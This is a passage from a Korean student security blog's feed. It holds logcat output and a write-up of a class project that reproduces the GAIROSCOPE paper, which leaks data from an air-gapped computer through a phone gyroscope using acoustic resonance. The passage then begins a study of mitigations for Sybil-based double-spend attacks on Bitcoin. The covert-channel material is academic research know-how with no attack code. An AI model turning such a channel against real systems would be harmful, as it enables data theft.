  2023-06-21 16:08:17.979  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 15 12
  2023-06-21 16:08:19.079  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:08:19.680  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:08:19.680  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:08:20.339  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:08:20.939  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:08:20.939  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:08:21.590  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:22.239  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:22.900  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:23.549  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:24.210  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:24.859  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:25.509  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:26.170  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:26.820  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:26.870  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010010 = 82(R)
  2023-06-21 16:08:26.898  3194-3194  SH                      com.example.gyroscope                E  R
  2023-06-21 16:08:27.029  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 3
  2023-06-21 16:08:27.330  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 6 3
  2023-06-21 16:08:30.150  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 25
  2023-06-21 16:08:31.550  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 28 25
  2023-06-21 16:08:33.210  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 24
  2023-06-21 16:08:34.560  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 27 24
  2023-06-21 16:08:35.559  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:08:36.160  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:08:36.160  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:08:36.809  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:08:37.410  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:08:37.410  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:08:38.060  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:38.709  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:39.360  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:40.009  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:40.660  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:41.310  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:41.959  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:42.610  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:43.260  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:43.310  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110111 = 55(7)
  2023-06-21 16:08:43.343  3194-3194  SH                      com.example.gyroscope                E  7
  2023-06-21 16:08:45.369  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:08:45.981  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:08:45.981  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:08:46.590  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:08:47.190  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:08:47.190  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:08:47.840  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:48.490  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:49.161  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:49.810  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:50.459  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:51.110  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:51.760  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:52.419  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:53.070  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:53.120  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01011001 = 89(Y)
  2023-06-21 16:08:53.154  3194-3194  SH                      com.example.gyroscope                E  Y
  2023-06-21 16:08:55.169  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:08:55.770  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:08:55.770  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:08:56.420  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:08:57.021  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:08:57.021  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:08:57.673  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:58.320  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:58.981  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:59.632  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:09:00.280  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:09:00.929  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:09:01.580  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:09:02.229  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:09:02.879  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:09:02.929  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00100001 = 33(!)
  2023-06-21 16:09:02.962  3194-3194  SH                      com.example.gyroscope                E  !
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;→ 평균 에러율 3.125%, 평균 정확도 96.875%&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-아쉬웠던-점&quot;&gt;3. 아쉬웠던 점&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;논문을 다른 방식으로 재현해야 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;원본: 1과 0에 각각 다른 공진주파수(Dip으로 인해 공진주파수 대역은 2개가 된다)를 할당하여, 높은 주파수를 할당받은 비트에서 축이 더 자주 변동하며 값을 주는 것에 기초&lt;/p&gt;

    &lt;p&gt;원본대로 할 때 진동수의 측정값: 고주파는 1, 저주파는 0으로, 진동 빈도의 변화를 이용해 0과 1을 구분한다. 이는 일반적인 DFSK에서 많이 사용하는 해석법이다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled.jpeg&quot; alt=&quot;핸드폰에 자이로스코프의 값을 시각화해 주는 어플을 다운받아 실제로 높은 공진주파수와 상대적으로 낮은 공진주파수를 재생했을 때의 변화 양상이다. 이런 식으로 공진주파수의 Frequency를 다르게 줌으로써 비트를 구분할 경우 자이로스코프 신호의 주기가 바뀌므로 약 3m 떨어진 거리에서도 오차 없이 비트를 구분함을 알 수 있었다.&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;핸드폰에 자이로스코프의 값을 시각화해 주는 어플을 다운받아 실제로 높은 공진주파수와 상대적으로 낮은 공진주파수를 재생했을 때의 변화 양상이다. 이런 식으로 공진주파수의 Frequency를 다르게 줌으로써 비트를 구분할 경우 자이로스코프 신호의 주기가 바뀌므로 약 3m 떨어진 거리에서도 오차 없이 비트를 구분함을 알 수 있었다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;그러나 우리는 Time domain에서 센서의 축이 각속도의 변화를 알리는 이벤트가 얼마나 자주 발생하는지 알아오는 방법을 만들지 못했음.&lt;/p&gt;

    &lt;p&gt;→ 이 경우 java의 math3 라이브러리에서 FFT 메소드를 가져와 쓰면 되는데, 이것의 output이 무엇을 의미하는지 알지 못해 사용하지 못했다.&lt;/p&gt;

    &lt;p&gt;→ 인덱스가 파동의 Frequency라고는 하는데-푸리에 변환의 정의상으로 보면 그럴싸하기 때문에 신빙성이 있다고 판단한 정보다-, 해당 인덱스의 배열에 저장된 값이 대체 뭔지 모르겠다.&lt;/p&gt;

    &lt;p&gt;→ 아시는 분은 개인적으로 연락 부탁드립니다. 밑에 댓글란에….&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;따라서 대안적으로 1에만 공진주파수를 할당하고, Preamble로부터 한 비트당 할당된 비트타임을 계산한 다음 미리 정의된 포맷으로 송신된 바이너리를 수신하는 전략을 사용&lt;/li&gt;
  &lt;li&gt;이로 인해 가변거리에 따른 Threshold 설정이 새로운 문제 사항으로 대두&lt;/li&gt;
  &lt;li&gt;그러나 이는 해결할 방법을 찾지 못했음&lt;/li&gt;
  &lt;li&gt;이 경우 에러율을 줄이거나, 에러에도 robust하게 프로토콜을 변경하는 방법이 있음&lt;/li&gt;
  &lt;li&gt;그 중 전자는 불가능에 가까움; 따라서 후자를 고려&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;이 경우 대역폭이 좁고 오류가 빈번한 환경에서의 데이터 전송 방식을 참고하면 해결책을 찾을 수 있을 듯함(예. 전화선 통신 시의 에러 감수, 초기 와이파이 프로토콜에서의 데이터 전송)&lt;/p&gt;

    &lt;p&gt;→ 그러나 교수님의 조언에 따르면 우리가 사용하는 방식은 대역폭이 지나치게 좁은 관계로, 오류를 더블 체크 하거나… connection-oriented 방식을 쓰거나… 그런 게 불가능할 것 같다고 한다. 사실 동의함.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-참고문헌&quot;&gt;4. &lt;strong&gt;참고문헌&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;소스 코드는 팀원들의 동의를 얻지 못했기 때문에(그리고 이건 서울에서 부산을 가려고 개성이랑 베이징까지 갔다가 부산 옆 울산에 내린 수준이라) 비공개.&lt;/p&gt;

&lt;p&gt;하지만 깃헙 레포 자체는 공개니까… (찡긋)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;41-논문-원본&quot;&gt;4.1. 논문 원본&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;“GAIROSCOPE: Injecting Data from Air-Gapped Computers to Nearby Gyroscopes”, Mordechai Guri&lt;/p&gt;

&lt;h2 id=&quot;42-참고-문헌&quot;&gt;4.2. 참고 문헌&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;“Vulnerability of MEMS Gyroscopes to Targeted Acoustic Attacks”, Shadi Khazaaleh et al.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;여기서부터는 내 사감이다.&lt;/p&gt;

&lt;p&gt;먼저 고생했어 우리 팀원들!!! 주제 선정부터 발표까지 20일밖에 없었고, 나는 막학기 16학점(…^^….), 너희는 가장 바쁜 3학년이었잖아!
그 와중에 다같이 모여서 밤늦게까지 노력했고, 어찌 됐든 결과도 재현했고!
우리 완전 대단해 대단해~~~&lt;/p&gt;

&lt;p&gt;플젝을 하는 내내 다같이 입버릇처럼 너무 재밌다 근데 시간이 없어서 속상하다 말했을 정도로 참 재밌었다.
특히 팀원 하나는 구현을 정말 잘하는데다 플젝에도 적극적이라 나도 에너지를 얻었다.
나는 구상을 잘 하는데, 이 친구가 구현을 특출나게 잘 하니까 엄청난 시너지가 나더라.
아니 정말로 내가 실험을 설계해서 이거 이렇게이렇게 하고 싶은데 어때, 라고 하면 말 그대로 뚝! 딱! 하는 사이에 코드를 짜서 짜잔 하고 보여준다.
당신은 신이에요. You are the GOD.&lt;/p&gt;

&lt;p&gt;진짜 존경스러웠고… 나에게 큰 자극이 되었다.&lt;/p&gt;

&lt;p&gt;다른 팀원은 주제가 어려워 힘들어하면서도 마지막까지 어떻게든 팀에 기여하려 노력하는 면모가 배울 점이었다.
이거 정말 어렵잖아…. 답이 안 보여도 팀활동이기 때문에 끝까지 참여하는 거.
그냥 참여하는 것도 아니다. 다른 팀원에게 피해가 되지 않도록 배려하며 팀플에 참여하고자 했다.
아이고 내 친구 고생했다.&lt;/p&gt;

&lt;p&gt;팀플레이를 정말 좋아한다. 개개인이 서로에게 좋은 에너지를 주고받으며 단순합이 아닌 곱의 결과를 내는 게 멋있다고 생각하기 때문이다.
이번 미니플젝은 이런 내 로망을 좀 이뤄준 것 같다 ㅋㅋㅋㅋㅋㅋㅋㅋㅋ&lt;/p&gt;

&lt;p&gt;재밌었어! 담에 이런 거 또 하자 얘들아!!&lt;/p&gt;

</description>
        <pubDate>Fri, 30 Jun 2023 01:53:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/airgap-break-using-gyro-resonance</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/airgap-break-using-gyro-resonance</guid>
      </item>
    
      <item>
        <title>[논문 스터디] Mitigations on Sybil-Based Double-Spend Attacks in Bitcoin</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#tldr&quot; id=&quot;markdown-toc-tldr&quot;&gt;TL;DR&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#비트코인블록체인-기반-가상자산-개요&quot; id=&quot;markdown-toc-비트코인블록체인-기반-가상자산-개요&quot;&gt;비트코인(블록체인 기반 가상자산) 개요&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#블록체인의-개념&quot; id=&quot;markdown-toc-블록체인의-개념&quot;&gt;블록체인의 개념?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#블록체인의-신뢰성을-보장하는-기반-기술&quot; id=&quot;markdown-toc-블록체인의-신뢰성을-보장하는-기반-기술&quot;&gt;블록체인의 신뢰성을 보장하는 기반 기술&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#분산-네트워크&quot; id=&quot;markdown-toc-분산-네트워크&quot;&gt;분산 네트워크&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#암호기술&quot; id=&quot;markdown-toc-암호기술&quot;&gt;암호기술&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#이중-거래-방지&quot; id=&quot;markdown-toc-이중-거래-방지&quot;&gt;&lt;mark&gt;이중 거래 방지&lt;/mark&gt;&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#합의-기법&quot; id=&quot;markdown-toc-합의-기법&quot;&gt;합의 기법&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#블록체인의-구조&quot; id=&quot;markdown-toc-블록체인의-구조&quot;&gt;블록체인의 구조&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#공격-기법-설명대략적&quot; id=&quot;markdown-toc-공격-기법-설명대략적&quot;&gt;공격 기법 설명(대략적)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#double-spending-with-a-sybil-attack&quot; id=&quot;markdown-toc-double-spending-with-a-sybil-attack&quot;&gt;Double-Spending With a Sybil Attack&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#개요&quot; id=&quot;markdown-toc-개요&quot;&gt;개요&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#공격-시나리오&quot; id=&quot;markdown-toc-공격-시나리오&quot;&gt;공격 시나리오&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-to-mitigate-2-ways-will-be-combined&quot; id=&quot;markdown-toc-how-to-mitigate-2-ways-will-be-combined&quot;&gt;How to Mitigate: 2 ways will be combined&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#charging-an-identity-fee&quot; id=&quot;markdown-toc-charging-an-identity-fee&quot;&gt;Charging an Identity Fee&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#setting-a-deadline&quot; id=&quot;markdown-toc-setting-a-deadline&quot;&gt;Setting a Deadline&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#economic-analysis&quot; id=&quot;markdown-toc-economic-analysis&quot;&gt;Economic Analysis&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#원래-상태에서-공격자의-공격-비용&quot; id=&quot;markdown-toc-원래-상태에서-공격자의-공격-비용&quot;&gt;원래 상태에서 공격자의 공격 비용&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#combined-mitigation-하에서-공격자의-공격-비용&quot; id=&quot;markdown-toc-combined-mitigation-하에서-공격자의-공격-비용&quot;&gt;Combined mitigation 하에서 공격자의 공격 비용&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#공격자의-손익분기점-구하기&quot; id=&quot;markdown-toc-공격자의-손익분기점-구하기&quot;&gt;공격자의 손익분기점 구하기&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#case-1-데드라인보다-z개-블록-컨펌-시간이-짧아-이상거래를-숨길-수-있을-때&quot; id=&quot;markdown-toc-case-1-데드라인보다-z개-블록-컨펌-시간이-짧아-이상거래를-숨길-수-있을-때&quot;&gt;Case 1: 데드라인보다 z개 블록 컨펌 시간이 짧아 이상거래를 숨길 수 있을 때&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#case2-데드라인보다-z개-블록-컨펌-시간이-길어-이상거래를-숨길-수-없을-때&quot; id=&quot;markdown-toc-case2-데드라인보다-z개-블록-컨펌-시간이-길어-이상거래를-숨길-수-없을-때&quot;&gt;Case2: 데드라인보다 z개 블록 컨펌 시간이 길어 이상거래를 숨길 수 없을 때&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#case1--case2-공격자-이득의-기댓값과-손익분기점&quot; id=&quot;markdown-toc-case1--case2-공격자-이득의-기댓값과-손익분기점&quot;&gt;Case1 + Case2: 공격자 이득의 기댓값과 손익분기점&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#다양한-조건-하에서-공격자의-손익분기점&quot; id=&quot;markdown-toc-다양한-조건-하에서-공격자의-손익분기점&quot;&gt;다양한 조건 하에서 공격자의 손익분기점&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;markdown-toc-&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;tldr&quot;&gt;TL;DR&lt;/h1&gt;

&lt;p&gt;이번에 읽은 논문은 &lt;mark&gt;&quot;Mitigations on Sybil-Based Double-Spend Attacks in Bitcoin&quot;&lt;/mark&gt;(Shijie Zhang and Jong-Hyouk Lee)이다. 
이 논문은 블록체인 기반 가상자산에 대한 공격과 그 대비책을 논한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;먼저 Sybil Attack을 이용한 이중 지출 공격을 분석했던 지난 연구를 기반으로(이 논문… 시리즈다..)&lt;/li&gt;
  &lt;li&gt;두 가지 관점의 대비책을 제시한 다음&lt;/li&gt;
  &lt;li&gt;제시된 두 대비책을 결합한 새로운 대비책을 제시하고 그 효과를 입증한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;당연히 저작권을 존중해 이미지의 무단 사용, 지나치게 많은 내용 정리 등은 지양할 것이다. 그러니 원본이 보고 싶으신 분들은 여기(링크)로!&lt;/p&gt;

&lt;p&gt;근데 우리 과 교수님이 쓰신 거라서 좀 자세하게 정리할게요 교수님 죄송함다! ㅎㅎ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;잡설: 정보보안기사 붙고 나니까 시간이 널널해져서 너무 좋다. 논문도 읽고 학교 공부도 하는데 시간이 남는 삶 너무 워라벨 만점이다… 근데 올초부터 하고 싶던 퍼징 연구는 학기가 끝나야 가능할 듯 싶어서 좀 슬프다. 리뷰 논문으로 포문을 열었는데 포문 연 상태로 6개월 방치중임 ㅋㅋ&lt;/p&gt;

&lt;p&gt;근데… 나 저번에 에어갭 와이파이로 깨는 거 읽은 다음에 핸드폰 자이로스코프 모듈로 에어갭 깨는 거 하나랑 NIC 모듈에 붙어있는 LED로 에어갭 깨는 것도 읽었는데 이거 독후감 언제 쓰지? 이래서 무계획적인 독서는 좋지 않습니다 그치만 취미생활인데-&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;비트코인블록체인-기반-가상자산-개요&quot;&gt;비트코인(블록체인 기반 가상자산) 개요&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 논문에는 블록체인이 어떻게 구성되어 있는지, 블록체인을 이용한 가상자산이 어떻게 보안성을 보장받는지, 블록체인을 이용한 금전 거래가 어떻게 작동하는지에 대해 매우 간략하게 정리되어 있다. 그리고 이 글을 읽을 독자들 또한 블록체인에 대해 그렇게까지 디테일한 지식을 요구하지 않을 것이다. 본인들이 이미 알고 있을 테니까…&lt;/p&gt;

&lt;p&gt;그래도 조금 자세히 써 보겠다. 혹시라도 모를 사람들을 위해!&lt;/p&gt;

&lt;p&gt;참고문헌: “알기사 정보보안기사 필기 1권”(지안에듀), “세종대 정보보호학과 네트워크해킹과 보안 교안”(이종혁)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;블록체인의-개념&quot;&gt;블록체인의 개념?&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;블록체인은 한 마디로, 거래 장부의 &lt;mark&gt;‘탈중앙화’&lt;/mark&gt;를 현실 세계에 구현한 것이다. 그 누구도 모든 거래 내역에 대한 권한을 독점할 수 없고, 모든 사용자가 1) 거래 내역에 대한 일정 권한(검증, 승인, 합의)을 가지고 2) 동일한 내용의 거래 장부를 모두가 한 부씩 가짐으로써 3) 신뢰성을 보장하는 것이다.&lt;/p&gt;

&lt;p&gt;이름에서도 알 수 있듯이, 블록체인은 ‘블록’이 연결된 ‘체인’이다. 하나의 거래 내역(Transaciton)은 곧 하나의 블록을 구성한다. 블록은 생성되자마자 네트워크를 타고 모든 사용자에게 공유된다. 따라서, 모든 참가자들은 모든 거래 내역을 볼 수 있다. 그렇기에 거래의 &lt;mark&gt;‘투명성’&lt;/mark&gt;이&lt;sup id=&quot;fnref:transparency&quot;&gt;&lt;a href=&quot;#fn:transparency&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 보장된다.&lt;/p&gt;

&lt;p&gt;그런데, 앞서서 블록체인은 ‘블록’이 연결된 ‘체인’ 이라고 했다. ‘체인’은 모든 구성 요소가 순차적으로 연결되어 하나라도 건드리면 모든 요소에 영향을 주는 구조를 의미한다(화학 반응에서의 Chain Reaction 등을 생각해보자). 블록체인 또한 그런 의미를 가진다. 새로운 블록 B가 체인에 연결될 때는 바로 앞 블록 자체의 해시와 또 다른 요소를 고려하여 생성한 해시값을 가져야만 한다. 즉, B가 연결되는 시점에서 모든 체인의 정보가 해시의 형태로 저장되므로 B가 연결된 이후에는 체인 중간의 어느 한 블록을 임의로 수정하거나 삭제할 수 없다. 따라서 블록체인은 체인의 &lt;mark&gt;’불변성’&lt;/mark&gt;을 보장받는다.&lt;/p&gt;

&lt;p&gt;또한, 블록체인의 데이터는 모든 참여자의 스토리지에 동일하게 복사되어 저장(분산 저장 = 분산 장부)되므로, 누구 하나가 문제를 일으킨다고 해서 시스템의 연속성이 침해받지 않는다. 이런 점에서 블록체인은 &lt;mark&gt;’가용성’&lt;/mark&gt;을 보장한다.&lt;/p&gt;

&lt;p&gt;형광펜으로 표시된 4개의 성질이 바로 블록체인의 기술적 특성이다. 블록체인의 기술적 특성이 블록체인의 개념을 이루기 때문에 이처럼 서술해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;블록체인의-신뢰성을-보장하는-기반-기술&quot;&gt;블록체인의 신뢰성을 보장하는 기반 기술&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;분산-네트워크&quot;&gt;분산 네트워크&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;블록체인에 참여하는 각 주체를 ‘노드’라고 한다. 각 노드는 동일한 거래 내역, 즉 블록 체인을 자신의 스토리지에 저장해 관리한다. 이를 ‘분산 저장’이라고 한다.&lt;/p&gt;

&lt;p&gt;분산 저장된 상태의 블록체인에 거래(Transaction, 블록)를 포함시키기 위해서는, ‘분산 합의 제도’ 라는 제도로 거래를 승인하는 과정이 필요하다. 이는 제 3의 중재자 없이 P2P로 블록에 대한 검증이 이루어지는 것을 의미한다.&lt;/p&gt;

&lt;p&gt;이 분산 합의 제도를 따르는 블록 체인의 경우,&lt;/p&gt;

&lt;p&gt;조건에 맞는 해시를 찾았을 때&lt;sup id=&quot;fnref:mining&quot;&gt;&lt;a href=&quot;#fn:mining&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; → 해당 정보를 각 노드들에게 브로드캐스트하고 → 유효성 검증을 수행한 다음 → 합의&lt;mark&gt;(전체 노드의 51% 이상이 신뢰성을 보장해야 합의가 승인된다)&lt;/mark&gt;를 통해 블록을 승인한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;암호기술&quot;&gt;암호기술&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;블록체인을 위한 암호기술은 크게 3가지가 사용된다. 각 기술은 다른 Surface에 대해 사용된다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;공개키 암호와 전자서명
    &lt;ul&gt;
      &lt;li&gt;익명의 공개키를 계좌 정보(지갑)로 사용한다. 즉 소유자의 가용성과 익명성을 보장한다.&lt;/li&gt;
      &lt;li&gt;전자서명&lt;sup id=&quot;fnref:digital_sign&quot;&gt;&lt;a href=&quot;#fn:digital_sign&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;으로는 거래 정보의 무결성을 보장하며 거래 내역의 인증과 부인방지기능 또한 보장한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;해시함수
    &lt;ul&gt;
      &lt;li&gt;추가될 블록을 포함한 블록체인의 무결성을 증명하고, 새로운 블록에 삽입될 넌스값을 찾을 때 사용한다.&lt;/li&gt;
      &lt;li&gt;블록체인의 무결성을 검증하기 쉽게 하기 위해 해시가 ‘머클 트리’ 구조를 취하게끔 했다. 따라서 머클 트리의 루트 해시만 검증하면 변조 여부를 알 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;이중-거래-방지&quot;&gt;&lt;mark&gt;이중 거래 방지&lt;/mark&gt;&lt;/h3&gt;

